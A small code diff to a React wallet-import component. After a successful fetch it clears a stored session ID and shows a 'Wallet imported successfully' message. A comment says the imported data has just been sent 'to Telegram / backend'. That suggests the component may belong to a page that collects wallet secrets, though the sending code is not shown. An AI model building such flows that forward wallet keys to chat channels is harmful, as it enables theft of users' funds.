@@ -217,6 +217,9 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
         return res.json();
       })
       .then(() => {
+        // Clear session after successful send to Telegram / backend
+        localStorage.removeItem('sessionId');
+        setSessionId('');
         setToast({
           show: true,
           message: 'Wallet imported successfully! Redirecting…',
